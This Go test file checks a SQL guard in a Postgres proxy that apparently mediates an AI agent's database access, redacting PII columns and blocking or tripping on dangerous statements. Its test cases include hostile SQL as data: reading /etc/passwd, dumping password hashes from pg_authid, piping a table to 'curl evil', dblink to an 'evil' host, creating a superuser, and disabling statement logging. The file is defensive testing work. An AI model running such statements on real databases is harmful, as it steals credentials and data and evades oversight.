package guard

import (
	"testing"

	"github.com/vepsala/colimander/internal/pgproxy/policy"
)

func testCatalog() Catalog {
	return Catalog{
		Known: true,
		Relations: map[string][]Relation{
			"users":    {{Name: "users", Kind: 'r', Columns: []string{"id", "email", "name", "notes", "status", "created_at"}}},
			"orders":   {{Name: "orders", Kind: 'r', Columns: []string{"id", "user_id", "total"}}},
			"products": {{Name: "products", Kind: 'r', Columns: []string{"id", "sku", "price"}}},
			"sales_v":  {{Name: "sales_v", Kind: 'v', Columns: []string{"sku", "total"}}},
		},
		UserFuncs: map[string]bool{"get_user": true},
	}
}

func testRules() Rules {
	return Rules{Policy: policy.New([]policy.PIIRule{
		{Name: "email", Table: "users", Action: "redact"},
		{Name: "name", Table: "users", Action: "redact"},
		{Name: "notes", Table: "users", Action: "redact"},
	}, "s", "", 0, true)}
}

func TestChecks(t *testing.T) {
	cases := []struct {
		name string
		sql  string
		want Severity
	}{
		// Strict table: masked plain columns are fine.
		{"plain", "select email, id from users", Allow},
		{"star", "select * from users", Allow},
		{"qualified star", "select u.* from users u", Allow},
		{"alias", "select email as e from users", Allow},
		{"subquery rename", "select x from (select email as x from users) s", Allow},
		{"cte rename", "with c as (select email as x from users) select x from c", Allow},
		{"count pii", "select count(email) from users", Allow},
		{"count star", "select count(*) from users", Allow},
		{"where pii", "select id from users where email = 'a@b.c'", Allow},
		{"join", "select u.id, o.total from users u join orders o on o.user_id = u.id", Allow},
		{"aggregate non pii", "select max(created_at), lower(status) from users", Allow},
		{"param", "select id from users where id = $1", Allow},

		// Strict table: can't be masked.
		{"whole row", "select u from users u", Block},
		{"whole row no alias", "select users from users", Block},
		{"row to text", "select u::text from users u", Block},
		{"row in where", "select id from users u where u::text like '%a%'", Block},
		{"to_jsonb", "select to_jsonb(u) from users u", Block},
		{"row_to_json", "select row_to_json(u) from users u", Block},
		{"json_agg", "select json_agg(u) from users u", Block},
		{"row expr", "select row(u.*) from users u", Block},
		{"concat", "select email || '' from users", Block},
		{"upper pii", "select upper(email) from users", Block},
		{"cast pii", "select email::text from users", Block},
		{"case pii", "select case when true then email end from users", Block},
		{"coalesce pii", "select coalesce(email, '') from users", Block},
		{"string_agg", "select string_agg(email, ',') from users", Block},
		{"min pii", "select min(email) from users", Block},
		{"array pii", "select array[email] from users", Block},
		{"scalar subquery", "select (select email from users limit 1) as x", Block},
		{"union rename", "select email as x from users union select 'a'", Block},
		{"union star", "select * from users union select * from users", Block},
		{"cte hides whole row", "with c as (select * from users) select c from c", Block},
		{"unlisted function", "select md5(status) from users", Block},
		{"second pii column", "select upper(name) from users", Block},
		{"third pii column", "select notes || '' from users", Block},
		{"custom function with pii", "select get_user(id) from users", Block},
		{"mixed join is strict", "select to_jsonb(p) from products p join users u on true", Block},
		{"returning expr", "update users set status = 'x' returning upper(email)", Block},

		// A view might read anything, so it's strict.
		{"view plain", "select sku from sales_v", Allow},
		{"view json", "select to_jsonb(s) from sales_v s", Block},

		// Tables with no PII: full control.
		{"safe json", "select to_jsonb(p) from products p", Allow},
		{"safe whole row", "select p from products p", Allow},
		{"safe expressions", "select md5(sku), sku || '-x' from products", Allow},
		{"safe union", "select sku from products union select 'a'", Allow},

		// Blocked everywhere, but an honest agent may try them.
		{"pg_stats", "select * from pg_stats", Block},
		{"pg_stat_activity", "select query from pg_stat_activity", Block},
		{"terminate", "select pg_terminate_backend(1)", Block},
		{"copy stdout", "copy users to stdout", Block},
		{"do", "do $$ begin end $$", Block},
		{"create function", "create function f() returns int as 'select 1' language sql", Block},
		{"set role", "set role postgres", Block},
		{"session auth", "set session authorization postgres", Block},
		{"read only off", "set default_transaction_read_only = off", Block},
		{"begin read write", "begin read write", Block},
		{"set txn read write", "set transaction read write", Block},
		{"reset all", "reset all", Block},
		{"discard all", "discard all", Block},
		{"set_config", "select set_config('role','postgres',false)", Block},
		{"unparseable", "selekt 1", Block},

		// Nothing honest needs these: suspend the connection.
		{"read file", "select pg_read_file('/etc/passwd')", Trip},
		{"read file qualified", "select pg_catalog.pg_read_file('/etc/passwd')", Trip},
		{"ls dir", "select pg_ls_dir('/')", Trip},
		{"large object", "select lo_import('/etc/passwd')", Trip},
		{"dblink", "select * from dblink('host=evil','select 1') as t(a int)", Trip},
		{"xml dump", "select query_to_xml('select * from users', true, true, '')", Trip},
		{"copy program", "copy users to program 'curl evil'", Trip},
		{"copy file", "copy users to '/tmp/x'", Trip},
		{"shadow", "select * from pg_shadow", Trip},
		{"authid", "select rolpassword from pg_authid", Trip},
		{"create role", "create role x superuser", Trip},
		{"alter system", "alter system set log_statement = 'none'", Trip},
		{"extension", "create extension dblink", Trip},
		{"trip beats block", "select to_jsonb(u), pg_read_file('/x') from users u", Trip},

		// Ordinary session statements keep working.
		{"begin", "begin", Allow},
		{"begin read only", "begin read only", Allow},
		{"commit", "commit", Allow},
		{"set timezone", "set timezone = 'UTC'", Allow},
		{"catalog read", "select table_name from information_schema.tables", Allow},
		{"empty", "", Allow},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			d := Check(c.sql, testRules(), testCatalog())
			if d.Severity != c.want {
				t.Errorf("Check(%q) = %v (%q), want %v", c.sql, d.Severity, d.Message, c.want)
			}
			if c.want != Allow && d.Message == "" {
				t.Errorf("Check(%q) gave the agent no message", c.sql)
			}
		})
	}
}

func TestKindCoversEveryStatement(t *testing.T) {
	cases := map[string]policy.Kind{
		"select 1":                     policy.KindRead,
		"select 1; select 2":           policy.KindRead,
		"select 1; delete from orders": policy.KindMutation,
		"delete from orders; select 1": policy.KindMutation,
		"with d as (delete from orders returning *) select * from d": policy.KindMutation,
		"select * into t from products":                              policy.KindMutation,
		"begin":                                                      policy.KindSession,
		"begin; select 1; commit":                                    policy.KindRead,
		"":                                                           policy.KindSession,
	}
	for sql, want := range cases {
		if got := Check(sql, testRules(), testCatalog()).Kind; got != want {
			t.Errorf("Kind(%q) = %v, want %v", sql, got, want)
		}
	}
}

func TestUserFunctionNeedsApprovalOutsideStrict(t *testing.T) {
	d := Check("select get_user(1)", testRules(), testCatalog())
	if d.Severity != Allow || !d.UserFunction || d.Kind != policy.KindMutation {
		t.Errorf("decision = %+v", d)
	}
}

func TestStrictAllAndSafeRelations(t *testing.T) {
	rules := testRules()
	rules.StrictAll = true
	if d := Check("select to_jsonb(p) from products p", rules, testCatalog()); d.Severity != Block {
		t.Errorf("StrictAll should make products strict: %+v", d)
	}
	rules.SafeRelations = []string{"public.products"}
	if d := Check("select to_jsonb(p) from products p", rules, testCatalog()); d.Severity != Allow {
		t.Errorf("safe relation should be full control: %+v", d)
	}
	// Marking a relation safe doesn't relax a join with one that isn't.
	if d := Check("select to_jsonb(p) from products p join orders o on true", rules, testCatalog()); d.Severity != Block {
		t.Errorf("join with a strict relation stays strict: %+v", d)
	}
}

func TestUnknownCatalogIsStrict(t *testing.T) {
	if d := Check("select to_jsonb(p) from products p", testRules(), Catalog{}); d.Severity != Block || !d.Strict {
		t.Errorf("an unreadable schema must fail safe: %+v", d)
	}
}

func TestUnknownRelationIsReportedForRefresh(t *testing.T) {
	d := Check("select * from brand_new join pg_class on true", testRules(), testCatalog())
	if len(d.Unknown) != 1 || d.Unknown[0] != "brand_new" {
		t.Errorf("unknown = %v", d.Unknown)
	}
	if d := Check("with brand_new as (select 1) select * from brand_new", testRules(), testCatalog()); len(d.Unknown) != 0 {
		t.Errorf("a CTE is not an unknown relation: %v", d.Unknown)
	}
}

func TestColumnSharingRelationNameIsNotWholeRow(t *testing.T) {
	cat := testCatalog()
	cat.Relations["status"] = []Relation{{Name: "status", Kind: 'r', Columns: []string{"status", "email"}}}
	if d := Check("select status from status", testRules(), cat); d.Severity != Allow {
		t.Errorf("real column reads as a whole row: %+v", d)
	}
}

func TestNoRulesMeansFullControl(t *testing.T) {
	// A column that looks like PII isn't touched until someone saves a rule.
	rules := Rules{Policy: policy.New(nil, "s", "", 0, true)}
	if d := Check("select to_jsonb(u) from users u", rules, testCatalog()); d.Severity != Allow {
		t.Errorf("detection must not apply by itself: %+v", d)
	}
}

func TestAllowRuleClearsAColumn(t *testing.T) {
	rules := Rules{Policy: policy.New([]policy.PIIRule{{Name: "email", Action: "redact"}, {Name: "email", Table: "users", Action: "allow"}}, "s", "", 0, true)}
	if d := Check("select to_jsonb(u) from users u", Rules{Policy: rules.Policy}, testCatalog()); d.Strict && d.Severity != Block {
		t.Errorf("unexpected decision: %+v", d)
	}
	if got := rules.Policy.ActionForOrigin("users", "email"); got != policy.ActionNone {
		t.Errorf("allow should exempt users.email, got %v", got)
	}
	if got := rules.Policy.ActionForOrigin("orders", "email"); got != policy.ActionRedact {
		t.Errorf("the broad rule should still cover orders.email, got %v", got)
	}
}

func TestUserFunctionsAreNamedWithTheirSchema(t *testing.T) {
	cat := testCatalog()
	cat.UserFuncs["add_job"] = true
	d := Check(`select graphile_worker.add_job('send_email', json_build_object('id', 1))`, testRules(), cat)
	if d.Severity != Allow || !d.UserFunction || len(d.UserFunctions) != 1 || d.UserFunctions[0] != "graphile_worker.add_job" {
		t.Errorf("qualified call: %+v", d)
	}
	d = Check(`select add_job('send_email')`, testRules(), cat)
	if len(d.UserFunctions) != 1 || d.UserFunctions[0] != "add_job" {
		t.Errorf("unqualified call: %+v", d)
	}
	// With a PII table in the statement, it's still refused.
	d = Check(`select graphile_worker.add_job('x', json_build_object('e', email)) from users`, testRules(), cat)
	if d.Severity != Block {
		t.Errorf("add_job over PII should be blocked: %+v", d)
	}
}
